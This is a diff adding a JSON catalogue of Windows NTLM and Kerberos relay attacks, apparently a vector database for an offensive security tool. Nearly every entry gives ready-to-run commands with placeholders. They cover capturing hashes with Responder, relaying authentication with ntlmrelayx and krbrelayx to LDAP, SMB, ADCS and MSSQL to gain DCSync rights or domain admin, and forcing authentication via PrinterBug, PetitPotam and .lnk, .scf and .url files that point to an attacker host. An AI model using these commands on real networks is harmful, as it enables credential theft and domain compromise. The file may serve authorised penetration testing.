@@ -1,0 +1,444 @@
+{
+  "service": "ntlm-relay",
+  "description": "NTLM and Kerberos relay attacks for credential capture and authentication relay",
+  "ports": [],
+  "serviceNames": [],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "relay-ntlm-listen",
+      "name": "NTLM Hash Capture via Responder",
+      "phase": "credential_access",
+      "prerequisites": ["network_access"],
+      "description": "Listen for and capture NTLM authentication attempts (NTLMv1/v2 hashes)",
+      "commands": [
+        {
+          "tool": "responder",
+          "command": "responder -I <interface>",
+          "description": "Capture NTLM hashes"
+        },
+        {
+          "tool": "responder",
+          "command": "responder -I <interface> --lm",
+          "description": "Force downgrade to LMv1 (easier to crack)"
+        },
+        {
+          "tool": "smbserver.py",
+          "command": "smbserver.py share . -smb2support",
+          "description": "Simple SMB server to capture hashes"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "relay-ntlm-to-smb",
+      "name": "NTLM Relay to SMB",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM authentication to SMB servers without signing for command execution",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
+          "description": "Find SMB servers without signing"
+        },
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support -socks",
+          "description": "Relay NTLM to SMB and create SOCKS proxy"
+        },
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support --ipv6 -socks",
+          "description": "Relay with IPv6 support"
+        }
+      ],
+      "outcomes": ["lateral_movement", "admin_access"]
+    },
+    {
+      "id": "relay-ntlm-to-ldap-rbcd",
+      "name": "NTLM Relay to LDAP for RBCD",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to LDAP/LDAPS to configure Resource-Based Constrained Delegation",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access",
+          "description": "Relay to LDAPS and configure RBCD"
+        }
+      ],
+      "outcomes": ["privilege_escalation", "admin_access"]
+    },
+    {
+      "id": "relay-ntlm-to-ldap-shadow",
+      "name": "NTLM Relay to LDAP for Shadow Credentials",
+      "phase": "credential_access",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to LDAP/LDAPS to add shadow credentials (msDS-KeyCredentialLink)",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'",
+          "description": "Relay to LDAPS and add shadow credentials"
+        }
+      ],
+      "outcomes": ["credential_access", "privilege_escalation"]
+    },
+    {
+      "id": "relay-ntlm-to-ldap-escalate",
+      "name": "NTLM Relay to LDAP for Privilege Escalation",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to LDAP to grant DCSync rights or other ACL modifications",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>",
+          "description": "Relay to LDAPS and grant DCSync rights"
+        }
+      ],
+      "outcomes": ["domain_admin", "privilege_escalation"]
+    },
+    {
+      "id": "relay-ntlm-to-ldap-shell",
+      "name": "NTLM Relay to LDAP for Interactive Shell",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to LDAP/LDAPS and get interactive LDAP shell for manual exploitation",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive",
+          "description": "Relay to LDAPS and get interactive shell on port 11000"
+        },
+        {
+          "tool": "nc",
+          "command": "nc 127.0.0.1 11000",
+          "description": "Connect to LDAP shell"
+        }
+      ],
+      "outcomes": ["lateral_movement"]
+    },
+    {
+      "id": "relay-http-to-ldap",
+      "name": "HTTP to LDAP Relay",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay HTTP authentication (from WebDAV coercion) to LDAP/LDAPS",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --delegate-access",
+          "description": "Relay HTTP to LDAPS (typically from WebDAV coercion)"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "relay-ntlm-to-mssql",
+      "name": "NTLM Relay to MSSQL",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM authentication to Microsoft SQL Server for database access",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t mssql://<ip> -smb2support -socks",
+          "description": "Relay to MSSQL and create SOCKS proxy"
+        }
+      ],
+      "outcomes": ["lateral_movement", "database_access"]
+    },
+    {
+      "id": "relay-ntlm-to-adcs-http",
+      "name": "NTLM Relay to ADCS HTTP (ESC8)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to ADCS web enrollment endpoint to obtain certificates",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
+          "description": "Relay to ADCS HTTP endpoint"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy relay -target http://<ip_ca>",
+          "description": "Relay to ADCS with certipy"
+        }
+      ],
+      "outcomes": ["domain_admin", "privilege_escalation"]
+    },
+    {
+      "id": "relay-ntlm-to-adcs-rpc",
+      "name": "NTLM Relay to ADCS RPC (ESC11)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to ADCS ICPR RPC interface to obtain certificates",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
+          "description": "Relay to ADCS RPC interface"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
+          "description": "Relay to ADCS RPC with certipy"
+        }
+      ],
+      "outcomes": ["domain_admin", "privilege_escalation"]
+    },
+    {
+      "id": "relay-ntlm-to-wsus",
+      "name": "NTLM Relay to WSUS",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Relay NTLM to Windows Server Update Services for malicious update deployment",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t https://<wsus_server>:8531 -smb2support",
+          "description": "Relay to WSUS server"
+        }
+      ],
+      "outcomes": ["lateral_movement", "admin_access"]
+    },
+    {
+      "id": "relay-ntlm-zerologon-dcsync",
+      "name": "Zerologon Safe Relay to DCSync",
+      "phase": "privilege_escalation",
+      "prerequisites": ["valid_credentials", "network_access"],
+      "description": "Safely exploit Zerologon by relaying one DC to another for DCSync without breaking the domain",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>",
+          "description": "Relay DC to DC for DCSync (safe Zerologon)"
+        }
+      ],
+      "outcomes": ["domain_admin"]
+    },
+    {
+      "id": "relay-ntlm-ms08-068",
+      "name": "MS08-068 SMB Self-Relay",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay SMB authentication back to the same host (Windows 2000/2008 only)",
+      "commands": [
+        {
+          "tool": "msf",
+          "command": "use exploit/windows/smb/smb_relay",
+          "description": "Exploit MS08-068 self-relay"
+        }
+      ],
+      "outcomes": ["admin_access"]
+    },
+    {
+      "id": "relay-ntlm-mic-removal",
+      "name": "NTLM MIC Removal (CVE-2019-1040)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Remove Message Integrity Code (MIC) from NTLMv2 to enable relay attacks that would otherwise be blocked",
+      "commands": [
+        {
+          "tool": "ntlmrelayx.py",
+          "command": "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support",
+          "description": "Relay with MIC removal (CVE-2019-1040)"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "relay-kerberos-to-http-adcs",
+      "name": "Kerberos Relay to HTTP ADCS (ESC8)",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay Kerberos authentication to ADCS HTTP endpoint",
+      "commands": [
+        {
+          "tool": "krbrelayx.py",
+          "command": "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>",
+          "description": "Relay Kerberos to ADCS HTTP"
+        }
+      ],
+      "outcomes": ["domain_admin", "privilege_escalation"]
+    },
+    {
+      "id": "relay-kerberos-to-smb",
+      "name": "Kerberos Relay to SMB",
+      "phase": "lateral_movement",
+      "prerequisites": ["network_access"],
+      "description": "Relay Kerberos authentication to SMB for lateral movement",
+      "commands": [
+        {
+          "tool": "krbrelayx.py",
+          "command": "krbrelayx.py -t smb://<target> -ip <attacker_ip>",
+          "description": "Relay Kerberos to SMB"
+        }
+      ],
+      "outcomes": ["lateral_movement"]
+    },
+    {
+      "id": "relay-kerberos-to-ldap",
+      "name": "Kerberos Relay to LDAP",
+      "phase": "privilege_escalation",
+      "prerequisites": ["network_access"],
+      "description": "Relay Kerberos authentication to LDAP/LDAPS for privilege escalation",
+      "commands": [
+        {
+          "tool": "krbrelayx.py",
+          "command": "krbrelayx.py -t ldaps://<dc_ip> --delegate-access -ip <attacker_ip>",
+          "description": "Relay Kerberos to LDAPS for RBCD"
+        }
+      ],
+      "outcomes": ["privilege_escalation"]
+    },
+    {
+      "id": "coerce-printerbug",
+      "name": "Coerce Authentication via PrinterBug",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Coerce target computer to authenticate to attacker using Print Spooler service",
+      "commands": [
+        {
+          "tool": "printerbug.py",
+          "command": "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
+          "description": "Trigger authentication via PrinterBug"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-petitpotam",
+      "name": "Coerce Authentication via PetitPotam",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Coerce target to authenticate using MS-EFSRPC (EFS Remote Protocol)",
+      "commands": [
+        {
+          "tool": "petitpotam.py",
+          "command": "petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>",
+          "description": "Coerce authentication via PetitPotam"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-coercer",
+      "name": "Coerce Authentication via Multiple RPC Methods",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Automated coercion using multiple RPC protocols (comprehensive tool)",
+      "commands": [
+        {
+          "tool": "coercer.py",
+          "command": "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>",
+          "description": "Attempt all coercion methods"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-kerberos",
+      "name": "Coerce Kerberos Authentication",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Coerce Kerberos authentication instead of NTLM by manipulating DNS",
+      "commands": [
+        {
+          "tool": "dnstool.py",
+          "command": "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
+          "description": "Add special DNS record for Kerberos coercion"
+        },
+        {
+          "tool": "petitpotam.py",
+          "command": "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>",
+          "description": "Coerce Kerberos authentication"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-drop-lnk",
+      "name": "Drop Malicious .lnk File for Coercion",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Drop malicious .lnk file on SMB shares to capture authentication when opened",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>",
+          "description": "Drop .lnk file pointing to attacker"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-drop-scf",
+      "name": "Drop Malicious .scf File for Coercion",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Drop malicious .scf file on SMB shares to capture authentication automatically",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M scuffy -o NAME=<filename> SERVER=<attacker_ip>",
+          "description": "Drop .scf file for automatic authentication"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-drop-url",
+      "name": "Drop Malicious .url File for Coercion",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Drop .url internet shortcut file to capture authentication",
+      "commands": [
+        {
+          "tool": "manual",
+          "command": "[InternetShortcut]\nURL=whatever\nIconFile=\\\\<attacker_ip>\\%USERNAME%.icon",
+          "description": "Create .url file pointing to attacker"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-ntlm-theft",
+      "name": "Generate All Coercion File Types",
+      "phase": "credential_access",
+      "prerequisites": ["network_access"],
+      "description": "Generate all possible file types that can coerce authentication",
+      "commands": [
+        {
+          "tool": "ntlm_theft.py",
+          "command": "ntlm_theft.py -g all -s <your_ip> -f test",
+          "description": "Generate all NTLM theft files"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    },
+    {
+      "id": "coerce-webdav-searchconnector",
+      "name": "WebDAV Coercion via searchConnector-ms",
+      "phase": "credential_access",
+      "prerequisites": ["valid_credentials"],
+      "description": "Enable WebClient service and drop searchConnector-ms file for WebDAV coercion",
+      "commands": [
+        {
+          "tool": "nxc",
+          "command": "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc",
+          "description": "Drop searchConnector-ms file"
+        },
+        {
+          "tool": "dnstool.py",
+          "command": "dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>",
+          "description": "Add DNS record for attacker"
+        }
+      ],
+      "outcomes": ["credential_access"]
+    }
+  ]
+}
